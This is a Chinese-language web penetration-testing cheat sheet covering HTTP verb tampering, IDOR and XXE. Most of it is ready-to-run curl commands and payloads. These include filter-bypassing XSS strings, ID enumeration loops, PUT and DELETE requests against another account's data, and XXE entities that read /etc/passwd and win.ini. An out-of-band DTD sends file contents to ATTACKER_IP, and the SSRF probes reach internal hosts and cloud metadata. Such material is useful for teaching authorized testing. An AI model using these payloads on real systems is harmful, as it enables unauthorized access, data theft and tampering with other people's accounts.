## HTTP Verb Tampering

### 理論

HTTP 協定允許多種方法（`GET`、`POST`、`HEAD`、`PUT`、`DELETE`、`OPTIONS`、`PATCH`）。當伺服器的授權或過濾器只檢查部分方法時，切換方法可能繞過限制。

**兩種成因：**

- **不安全設定**：Web Server 只對 GET/POST 套認證，PUT/HEAD 被放過
- **不安全程式碼**：過濾器只讀 `$_POST`，但功能用 `$_REQUEST`（GET+POST 合集）

**攻擊前問：**
1. 哪個端點受保護？
2. 正常方法是 GET 還是 POST？
3. 目標是繞過授權，還是繞過輸入過濾？

### 方法一：列舉伺服器允許的方法

```bash
# OPTIONS 方法：詢問伺服器對某路徑接受哪些 HTTP 方法
curl -s -I -X OPTIONS http://TARGET/admin/
# -s      → 靜默模式，只看 header
# -I      → 只顯示 response header（HEAD-like）
# -X OPTIONS → 指定 HTTP 方法為 OPTIONS

# 看回應的 Allow header，例如：Allow: GET, POST, HEAD, OPTIONS
# 若看到 PUT 或 DELETE → 值得深入測試
```

### 方法二：測試不同方法對保護端點的差異

```bash
# 正常 GET（預期回 401/403）
curl -s -o /dev/null -w "%{http_code}" http://TARGET/admin/

# 改用 HEAD（常被授權設定忽略）
curl -s -o /dev/null -w "%{http_code}" -X HEAD http://TARGET/admin/
# 若 GET 回 401 但 HEAD 回 200 → Verb Tampering 成立

# 改用 POST
curl -s -o /dev/null -w "%{http_code}" -X POST http://TARGET/admin/

# 改用 PUT
curl -s -o /dev/null -w "%{http_code}" -X PUT http://TARGET/admin/
```

### 方法三：繞過輸入過濾（POST → GET 或 GET → POST）

```bash
# 情境：應用用 $_POST 做 XSS 過濾，但實際功能讀 $_REQUEST
# 原始 POST 請求（被過濾阻擋）
curl -s -X POST http://TARGET/search \
  -d "query=<script>alert(1)</script>"
# 400 或被過濾

# 改用 GET 繞過（$_POST 過濾器不讀 GET 參數）
curl -s "http://TARGET/search?query=<script>alert(1)</script>"
# 若回應包含 <script> → 過濾器只擋 POST，Verb Tampering 繞過成立
```

### 決策流程

```
受保護端點
    ↓
curl -X OPTIONS → 看 Allow header
    ↓
對比 GET / POST / HEAD 回應碼差異
    ↓
是否有 2xx 但本應 4xx？
  → 是：授權繞過成立
  → 否：測試過濾器 → GET vs POST 輸入行為差異
```

## IDOR（Insecure Direct Object References）

### 理論

IDOR 的核心：應用暴露了可操作的物件參考（ID、檔名、UUID），後端沒有驗證請求者是否有權存取該物件。

**關鍵判斷：**
- 不是「ID 難不難猜」的問題
- 是「後端有沒有對物件層做授權」的問題

**兩種高價值方向：**
- 資訊洩露型：讀取他人的資料、文件、設定
- 不安全操作型：用他人的 ID 做更新、刪除、建立

### 方法一：發現可操作的物件參考

```bash
# 觀察 URL 中是否有可替換的數字 ID
# 例如：http://TARGET/api/profile?uid=1001

# 用 Burp 或 curl 替換 ID
curl -s -H "Cookie: session=YOUR_TOKEN" \
  "http://TARGET/api/profile?uid=1001"
# 改成他人的 ID
curl -s -H "Cookie: session=YOUR_TOKEN" \
  "http://TARGET/api/profile?uid=1002"
# 若回傳他人資料 → IDOR 成立
```

### 方法二：批次枚舉 IDOR

```bash
# Bash 迴圈測試連續 ID
for id in {1..100}; do
  response=$(curl -s -o /dev/null -w "%{http_code}" \
    -H "Cookie: session=YOUR_TOKEN" \
    "http://TARGET/api/users/$id")
  echo "ID $id → HTTP $response"
done
# 過濾出 200：
for id in {1..100}; do
  code=$(curl -s -o /dev/null -w "%{http_code}" \
    -H "Cookie: session=YOUR_TOKEN" \
    "http://TARGET/api/users/$id")
  [ "$code" = "200" ] && echo "[+] ID $id accessible"
done
```

### 方法三：非數字參考（Hash / UUID / 檔名）

```bash
# 若回應中的 API JSON 暴露了他人的 UUID
# 例如回應：{"user_id": "abc123", "files": [{"id": "xyz789"}]}

# 直接用該 UUID 存取
curl -s -H "Cookie: session=YOUR_TOKEN" \
  "http://TARGET/api/download?file_id=xyz789"

# 若為 Base64 編碼的參考
echo "dXNlcjE=" | base64 -d   # → user1
echo -n "user2" | base64       # → dXNlcjI=
curl -s -H "Cookie: session=YOUR_TOKEN" \
  "http://TARGET/api/profile?ref=dXNlcjI="
```

### 方法四：IDOR 對寫入操作（BOLA）

```bash
# 用帳號 A 的 token 操作帳號 B 的資源
# PUT 更新他人資料
curl -s -X PUT \
  -H "Cookie: session=ACCOUNT_A_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"email": "attacker@evil.com"}' \
  "http://TARGET/api/users/ACCOUNT_B_ID"
# 200 且資料被改 → 高危 IDOR

# DELETE 他人資源
curl -s -X DELETE \
  -H "Cookie: session=ACCOUNT_A_TOKEN" \
  "http://TARGET/api/posts/ACCOUNT_B_POST_ID"
```

### 決策流程

```
找到含 ID/UUID/檔名 的 URL 或 API 端點
    ↓
建立兩個測試帳號（A 和 B）
    ↓
用 A 的 token 請求 B 的物件 ID
    ↓
後端有回傳 B 的資料？
  → 是：IDOR 成立（資訊洩露）
  → 確認後：用 A 的 token 對 B 的物件做 PUT/DELETE
      → 成功：IDOR + 不當操作（高危）
```

## XXE（XML External Entity）

### 理論

XXE 發生在應用接受使用者可控的 XML，且 parser 不安全地處理外部實體。攻擊者可透過定義外部實體讀取本機檔案、發出 SSRF 請求或與外部互動。

**常見入口：**
- XML 表單（聯絡、設定、匯入功能）
- SOAP API
- SVG / Office 文件上傳
- Content-Type: application/xml 的 API

**三種回顯路徑（重要！）：**
1. **直接回顯**：實體內容出現在回應 body 中
2. **Error-based**：實體路徑錯誤，錯誤訊息洩露內容
3. **OOB（帶外）**：無回顯，透過外部 DNS/HTTP 請求滲出資料

### 方法一：確認 parser 會展開實體（最小探測）

```xml
<!-- 先送最小 payload 確認 parser 有無展開內部實體 -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
  <!ENTITY canary "XXETEST_CANARY">
]>
<root><data>&canary;</data></root>

<!-- 若回應包含 XXETEST_CANARY → parser 展開實體 → 繼續測外部實體 -->
<!-- 若沒有 → parser 可能不接受 DOCTYPE 或已停用實體 -->
```

```bash
# curl 送 XML payload
curl -s -X POST \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY c "CANARY">]><root><data>&c;</data></root>' \
  "http://TARGET/api/import"
# 看回應是否含 CANARY
```

### 方法二：直接回顯型 XXE（讀本機檔案）

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><data>&xxe;</data></root>
```

```bash
# 送 XXE payload 讀 /etc/passwd
curl -s -X POST \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root><data>&xxe;</data></root>' \
  "http://TARGET/api/import"
# 若回應含 root:x:0:0: → XXE 讀檔成立

# 讀 Windows 常用目標
curl -s -X POST \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><root><data>&xxe;</data></root>' \
  "http://TARGET/api/import"
```

### 方法三：OOB XXE（無回顯時使用外部 DTD）

```bash
# 步驟 1：在攻擊機建立惡意 DTD 檔
# evil.dtd 內容：
cat > /tmp/evil.dtd << 'EOF'
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % exfil "<!ENTITY exfiltrate SYSTEM 'http://ATTACKER_IP:8000/?data=%file;'>">
%exfil;
EOF

# 步驟 2：起一個 HTTP server 提供 evil.dtd
python3 -m http.server 8000
# 在另一個終端監聽

# 步驟 3：送 OOB XXE payload，引用外部 DTD
curl -s -X POST \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://ATTACKER_IP:8000/evil.dtd">%xxe;]><root>&exfiltrate;</root>' \
  "http://TARGET/api/import"
# 若 HTTP server 收到含 data= 的請求 → OOB XXE 成功，資料滲出
```

### 方法四：XXE 用於 SSRF（探測內網）

```bash
# 用 XXE 實體發出內網 HTTP 請求
curl -s -X POST \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://192.168.1.1/admin">]><root><data>&xxe;</data></root>' \
  "http://TARGET/api/import"
# 若回應包含內網服務回應 → XXE-SSRF 成立
# 可用於探測 169.254.169.254（AWS metadata）、內網服務埠口等
```

### 決策流程

```
找到接受 XML 的端點（Content-Type: application/xml 或 SOAP）
    ↓
送內部實體 CANARY 測試 → 回應有 CANARY？
  → 是：parser 展開實體
      ↓
      送外部實體 file:///etc/passwd
        → 有回顯：直接讀檔
        → 無回顯：
            改用 error-based 或 OOB（evil.dtd + HTTP server）
  → 否：嘗試改 Content-Type 或找其他 XML 入口
```
